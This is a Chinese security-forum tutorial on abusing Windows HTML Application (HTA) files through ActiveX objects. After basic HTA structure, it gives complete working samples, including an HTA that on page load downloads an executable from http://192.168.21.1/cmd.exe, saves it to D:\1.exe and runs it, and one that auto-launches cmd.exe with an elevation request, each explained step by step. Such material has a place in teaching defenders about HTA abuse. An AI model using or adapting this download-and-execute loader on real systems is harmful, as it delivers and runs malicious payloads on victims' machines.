# HTML Application利用-先知社区

> **来源**: https://xz.aliyun.com/news/16383  
> **文章ID**: 16383

---

本代码仅供学习、研究、教育或合法用途。开发者明确声明其无意将该代码用于任何违法、犯罪或违反道德规范的行为。任何个人或组织在使用本代码时，需自行确保其行为符合所在国家或地区的法律法规。  
开发者对任何因直接或间接使用该代码而导致的法律责任、经济损失或其他后果概不负责。使用者需自行承担因使用本代码产生的全部风险和责任。请勿将本代码用于任何违反法律、侵犯他人权益或破坏公共秩序的活动。

## HTA介绍与用法

HTML应用程序（HTML Application，简称 HTA）是 Microsoft 提供的一种用于创建桌面应用程序的技术。HTA 文件使用标准的 HTML、CSS 和 JavaScript 编写，并通过 Windows 系统的`mshta.exe`运行。HTA 的核心特性是允许开发者使用 HTML 和 JavaScript 创建可以直接访问 Windows 系统功能的本地桌面应用程序。

---

## **HTA 的特点**

1. **HTML 和 JavaScript 驱动：** HTA 使用标准的 HTML 和 JavaScript，因此 Web 开发人员可以轻松上手。
2. **系统权限：** HTA 应用程序不像浏览器中运行的 HTML 页面那样受到沙盒限制，它可以直接访问系统资源，比如文件操作、注册表操作、运行系统命令等。
3. **独立运行：** HTA 文件是独立的应用程序，不依赖浏览器，可以通过双击直接运行。
4. **窗口自定义：** HTA 允许自定义窗口外观，如标题栏、边框、菜单等，可以做成类似本地软件的界面。

---

## **HTA 文件的结构**

HTA 文件的核心是一个 HTML 文件，其中包含特殊的

标签，该标签定义了 HTA 的应用程序属性，例如标题、窗口大小、图标等。

### **基本 HTA 结构**

```
<!DOCTYPE html>
<html>
<head>
    <title>HTA 示例</title>
    <hta:application
        id="myHTA"
        applicationname="HTA 示例"
        border="thin"
        caption="yes"
        icon="app.ico"
        maximizebutton="yes"
        minimizebutton="yes"
        scroll="no"
        singleinstance="yes"
        windowstate="normal"
    />
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        button {
            padding: 10px 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>HTA 示例应用</h1>
    <p>这是一个简单的 HTA 应用程序。</p>
    <button onclick="sayHello()">点击我</button>

    <script>
        function sayHello() {
            alert('Hello, HTA!');
        }
    </script>
</body>
</html>
```

---

## **HTA 中的\*\***标签属性详解\*\*

是 HTA 的核心，定义了应用的各种属性，以下是常用的属性及其作用：

| **属性** | **描述** | **可能的值** |
| --- | --- | --- |
| `id` | 应用程序的唯一 ID | 自定义字符串 |
| `applicationname` | 应用程序的名称，显示在任务栏或窗口标题中 | 自定义字符串 |
| `border` | 窗口边框样式 | `none` 、 `thin` 、 `thick` |
| `caption` | 是否显示标题栏 | `yes` 或 `no` |
| `icon` | 应用程序的图标文件路径 | 图标文件路径 (如 `app.ico` ) |
| `maximizebutton` | 是否显示最大化按钮 | `yes` 或 `no` |
| `minimizebutton` | 是否显示最小化按钮 | `yes` 或 `no` |
| `scroll` | 是否允许窗口显示滚动条 | `yes` 或 `no` |
| `singleinstance` | 是否限制只能运行一个实例 | `yes` 或 `no` |
| `windowstate` | 窗口的初始状态 | `normal` 、 `maximize` 、 `minimize` |
| `sysmenu` | 是否显示系统菜单 | `yes` 或 `no` |

---

## **HTA 的恶意利用：ActiveX 对象**

HTA 的强大功能源于它对 ActiveX 对象的支持，允许访问 Windows 系统功能。

### **实例：访问文件系统**

以下是一个使用 ActiveX 对象读取本地文件的示例：

```
<!DOCTYPE html>
<html>
<head>
    <title>文件读取示例</title>
    <hta:application
        applicationname="文件读取示例"
        border="thin"
        caption="yes"
        scroll="no"
        windowstate="normal"
    />
    <script>
        function readFile() {
            try {
                // 创建 ActiveX 文件系统对象
                var fso = new ActiveXObject("Scripting.FileSystemObject");

                // 打开文件
                var file = fso.OpenTextFile("example.txt", 1); // 1 表示只读模式

                // 读取内容
                var content = file.ReadAll();
                file.Close();

                // 显示内容
                alert("文件内容：\n" + content);
            } catch (err) {
                alert("无法读取文件：" + err.message);
            }
        }
    </script>
</head>
<body>
    <h1>文件读取示例</h1>
    <p>点击按钮读取本地文件的内容。</p>
    <button onclick="readFile()">读取文件</button>
</body>
</html>
```

#### **说明：**

1. 上述代码使用了`Scripting.FileSystemObject`ActiveX 对象读取文件。
2. 保存文件为`readFile.hta`。
3. 在运行的目录中准备一个`example.txt`文件（内容任意）。
4. 双击运行`readFile.hta`，点击按钮即可读取文件内容。

---

## **HTA恶意利用：运行系统命令**

HTA 可以通过`WScript.Shell`ActiveX 对象运行系统命令，例如打开程序或执行批处理脚本。

### **实例：运行系统命令**

```
<!DOCTYPE html>
<html>
<head>
    <title>运行系统命令</title>
    <hta:application
        applicationname="运行系统命令"
        border="thin"
        caption="yes"
        scroll="no"
        windowstate="normal"
    />
    <script>
        function runCommand() {
            try {
                // 创建 WScript Shell 对象
                var shell = new ActiveXObject("WScript.Shell");

                // 运行命令
                var command = "notepad.exe"; // 启动记事本
                shell.Run(command);
            } catch (err) {
                alert("无法运行命令：" + err.message);
            }
        }
    </script>
</head>
<body>
    <h1>运行系统命令</h1>
    <p>点击按钮启动记事本。</p>
    <button onclick="runCommand()">运行命令</button>
</body>
</html>
```

---

## HTA利用的实例1：

```
<!DOCTYPE html>
<html>
<head>
    <title>下载并运行1.exe</title>
    <HTA:APPLICATION
        ID="app"
        APPLICATIONNAME="DownloadAndRunExe"
        BORDER="thin"
        BORDERSTYLE="normal"
        CAPTION="yes"
        CONTEXTMENU="no"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="no"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
    />
    <script type="text/javascript">
        // 定义下载和运行的函数
        function downloadAndRun() {
            try {
                var url = "http://192.168.21.1/cmd.exe"; // 文件的下载地址
                var destination = "D:\\1.exe"; // 下载到本地的位置

                // 创建 XMLHTTP 对象来下载文件
                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                xhr.open("GET", url, false); // 同步请求
                xhr.send();

                if (xhr.status === 200) {
                    // 创建文件系统对象
                    var stream = new ActiveXObject("ADODB.Stream");
                    stream.Type = 1; // 二进制类型
                    stream.Open();
                    stream.Write(xhr.responseBody); // 写入响应内容
                    stream.SaveToFile(destination, 2); // 保存到指定位置
                    stream.Close();

                    // 下载完成后运行文件
                    var shell = new ActiveXObject("WScript.Shell");
                    shell.Run(destination);

                    //window.close(); // 运行后自动关闭 HTA 窗口
                } else {
                    alert("下载失败，错误代码：" + xhr.status);
                }
            } catch (e) {
                alert("发生错误：" + e.message);
            }
        }

        // 在页面加载时自动执行
        window.onload = downloadAndRun;
    </script>
</head>
<body>
</body>
</html>
```

主逻辑函数`downloadAndRun`

完成以下步骤：

* **下载文件**
* **保存文件到本地**
* **运行下载的文件**

代码如下：

```
function downloadAndRun() {
    try {
        var url = "http://192.168.21.1/cmd.exe"; // 文件的下载地址
        var destination = "D:\\1.exe"; // 下载到本地的位置

        // 创建 XMLHTTP 对象来下载文件
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false); // 同步请求
        xhr.send();
```

#### **步骤 1：设置下载地址与保存路径**

* `url`是文件的下载地址（在这里是`http://192.168.21.1/cmd.exe`）。
* `destination`是本地保存文件的路径（这里保存到`D:\1.exe`）。

---

#### **步骤 2：使用**`**MSXML2.XMLHTTP**`**对象下载文件**

```
var xhr = new ActiveXObject("MSXML2.XMLHTTP");
xhr.open("GET", url, false); // 同步请求
xhr.send();
```

* `ActiveXObject("MSXML2.XMLHTTP")`：创建一个 XMLHTTP 对象，用于发送 HTTP 请求。
* `xhr.open("GET", url, false)`：发起一个同步的 GET 请求，目标为文件的下载地址。
* `xhr.send()`：发送请求并等待服务器响应。

---

#### **步骤 3：处理服务器响应并保存文件**

```
if (xhr.status === 200) {
    // 创建文件系统对象
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // 二进制类型
    stream.Open();
    stream.Write(xhr.responseBody); // 写入响应内容
    stream.SaveToFile(destination, 2); // 保存到指定位置
    stream.Close();
```

* **检查响应状态：**
  + 如果`xhr.status === 200`，表示文件下载成功（HTTP 状态码 200 表示请求成功）。
  + 如果状态码不是 200，则会触发错误提示（见后文）。
* **保存文件：**
  + 使用`ADODB.Stream`ActiveX 对象保存文件。
  + `stream.Type = 1`：设置流类型为二进制。
  + `stream.Write(xhr.responseBody)`：将下载的文件内容写入流。
  + `stream.SaveToFile(destination, 2)`：将流保存到指定位置（`destination`），其中`2`表示文件覆盖模式。
  + `stream.Close()`：关闭流对象。

---

#### **步骤 4：运行已下载的文件**

```
var shell = new ActiveXObject("WScript.Shell");
shell.Run(destination);
```

* 使用`WScript.Shell`的`Run`方法运行下载到本地的文件。
* 这里运行的是`D:\1.exe`。

---

#### **步骤 5：错误处理**

```
} else {
    alert("下载失败，错误代码：" + xhr.status);
}
```

* 如果`xhr.status`不是 200，表示请求失败，弹出错误提示。

#### **步骤 6：捕获异常**

```
} catch (e) {
    alert("发生错误：" + e.message);
}
```

## HTA利用的实例2：

```
<!DOCTYPE html>
<html>
<head>
    <title>UAC 权限运行测试</title>
    <HTA:APPLICATION
        ID="app"
        APPLICATIONNAME="UACTest"
        BORDER="thin"
        BORDERSTYLE="normal"
        CAPTION="yes"
        CONTEXTMENU="no"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="no"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
    />
    <script type="text/javascript">
        function runWithUAC() {
            try {
                // 创建 Shell.Application 对象
                var shell = new ActiveXObject("Shell.Application");

                // 使用 ShellExecute 方法，以 UAC 权限运行 calc.exe
                // 第一个参数是程序路径，第二个参数是参数（为空），第三个是启动目录，第四个是 "runas"（请求提升权限），第五个是窗口状态
                shell.ShellExecute("cmd.exe", "", "", "runas", 1);

            } catch (e) {
                alert("发生错误：" + e.message);
            }
        }

        // 在页面加载时自动执行
        window.onload = runWithUAC;
    </script>
</head>
<body>
</body>
</html>
```

### 代码总体功能

1. 定义 HTA 应用窗口外观和行为。
2. 使用`Shell.Application`的`ShellExecute`方法以管理员权限运行`cmd.exe`

#### `runWithUAC`函数：提升权限运行程序

以下是核心代码逻辑：

```
function runWithUAC() {
    try {
        // 创建 Shell.Application 对象
        var shell = new ActiveXObject("Shell.Application");

        // 使用 ShellExecute 方法，以 UAC 权限运行 cmd.exe
        shell.ShellExecute("cmd.exe", "", "", "runas", 1);

    } catch (e) {
        alert("发生错误：" + e.message);
    }
}
```

#### `**ShellExecute**`**方法运行程序**

```
shell.ShellExecute("cmd.exe", "", "", "runas", 1);
```

* `**ShellExecute**`**方法参数解析：**
  + **第一个参数**：程序路径，这里是`"cmd.exe"`。
  + **第二个参数**：传递给程序的参数，这里为空字符串`""`（无参数）。
  + **第三个参数**：程序的启动目录，这里为空字符串`""`（使用默认目录）。
  + **第四个参数**：指定程序以何种方式运行：
    - `"runas"`：以管理员权限运行（触发 UAC 提升权限提示）。
    - 其他值（如`open`）：普通权限运行。
  + **第五个参数**：窗口显示状态，常用值：
    - `1`：正常显示窗口。
    - `0`：隐藏窗口。
